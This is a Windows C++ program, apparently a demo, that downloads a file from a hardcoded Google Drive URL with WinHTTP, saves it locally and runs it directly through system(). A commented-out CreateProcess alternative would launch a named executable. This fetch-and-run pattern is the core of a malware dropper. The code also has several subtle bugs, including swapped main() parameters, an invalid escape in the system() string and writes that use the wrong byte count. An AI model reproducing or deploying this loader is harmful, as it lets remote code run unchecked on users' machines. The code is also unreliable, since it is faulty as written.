#include <windows.h>
#include <winhttp.h>
#include <iostream>
#pragma comment(lib, "winhttp.lib")
using namespace std;

int main(wchar_t** argv, int argc)
{
	//Variables 

	HANDLE hMainThread = NULL; //Main Thread
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPBYTE pszOutBuffer;

	BOOL  bResults = FALSE, flag = TRUE;
	HINTERNET  hSession = NULL, hConnect = NULL, hRequest = NULL;
	// Use WinHttpOpen to obtain a session handle.
	hSession = WinHttpOpen(L"templog", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

	// Specify an HTTP server.
	if (hSession)
		hConnect = WinHttpConnect(hSession, L"drive.google.com", INTERNET_DEFAULT_HTTPS_PORT, 0);

	if (!hConnect) {
		printf("Error %d has occurred.\n", GetLastError());
		flag = false;
	}
	// Create an HTTP request handle.
	if (hConnect)
		hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/u/1/uc?id=1QcRsZCiD-oScR4VkE4qM6cNy8Crgg5UL&export=download/sample_file.txt", NULL, WINHTTP_NO_REFERER, NULL, WINHTTP_FLAG_SECURE);
		
	if (!hRequest) {
		printf("Error %d has occurred.\n", GetLastError());
		flag = false;
	}
	// Send a request.
	cout << "Sending HTTP Request using GET Method to download a file..." << endl;
	if (hRequest)
		bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
	// End the request.
	if (bResults)
		bResults = WinHttpReceiveResponse(hRequest, NULL);/**/
	// Keep checking for data until there is nothing left.

	//Replace "sample_file.txt" with your own file name
	HANDLE hFile = CreateFile(L"sample_file.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	
	if (bResults)
		do
		{
			// Check for available data.        
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
				printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
				flag = false;
			}

			// Allocate space for the buffer.        
			pszOutBuffer = new byte[dwSize + 1];
			if (!pszOutBuffer)
			{
				printf("Out of memory\n");
				flag = false;
				dwSize = 0;
			}
			else
			{
				// Read the Data.            
				ZeroMemory(pszOutBuffer, dwSize + 1);
				if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
				{
					printf("Error %u in WinHttpReadData.\n", GetLastError());
					flag = false;
				}
				else
				{
					//printf("%s", pszOutBuffer); 
					DWORD wmWritten;
					bool fr = WriteFile(hFile, pszOutBuffer, dwSize, &wmWritten, NULL);
					int n = GetLastError();
				}
				// Free the memory allocated to the buffer.            
				delete[] pszOutBuffer;
			}
		} while (dwSize > 0);
		CloseHandle(hFile);
		// Report any errors.
		if (!bResults) {
			printf("Error %d has occurred.\n", GetLastError());
			flag = false;
		}
		// Close any open handles.
		if (hRequest) WinHttpCloseHandle(hRequest);
		if (hConnect) WinHttpCloseHandle(hConnect);
		if (hSession) WinHttpCloseHandle(hSession);
		if (flag) {
			cout << "Downloading process is done!" << endl;
			cout << "Now execute the downloaded file..." << endl;
			//Direct Execution...
			cout << "End of the program... Enter any key to exit..." << endl;
			system("\ sample_file.txt"); //It will execute any kind of file directly.

			
			// Uncomment below part to execute downloaded program only not the files which requires any other application to open.
			// For example. if downloaded file is sample_file.txt , it requires the notepad.exe for execution. 
			// So below method fails for such files.

			/*
			cout << "Execution of downloaded file using CreateProcess function..." << endl;
			HANDLE hProcess = NULL;
			STARTUPINFO si;
			PROCESS_INFORMATION pi;
			DWORD dwProcessID = 0;
			DWORD dwMainThreadID = 0;
			ZeroMemory(&si, sizeof(si));
			ZeroMemory(&pi, sizeof(pi));
			BOOL bCreateProcess = NULL;
			//Replace "dapp.exe" with the downloaded program name
			bCreateProcess = CreateProcess(L"dapp.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
			if (bCreateProcess == FALSE)cout << "Execution/Create Process is Failed with Error :  " << GetLastError() << endl;
			else cout << "Create/Execution Process is Successful.." << endl;
			cout << "End of the program... Enter any key to exit..." << endl;
			//WaitForSingleObject(pi.hProcess, INFINITE);
			CloseHandle(hProcess);
			*/
		}
		if (!flag) {
			cout << "But empty file is downloaded which is not the required file. Check server address and file path..." << endl;
			cout << "End of the program... Enter any key to exit..." << endl;
		}
		CloseHandle(hMainThread);
		system("PAUSE");
		return 0;
}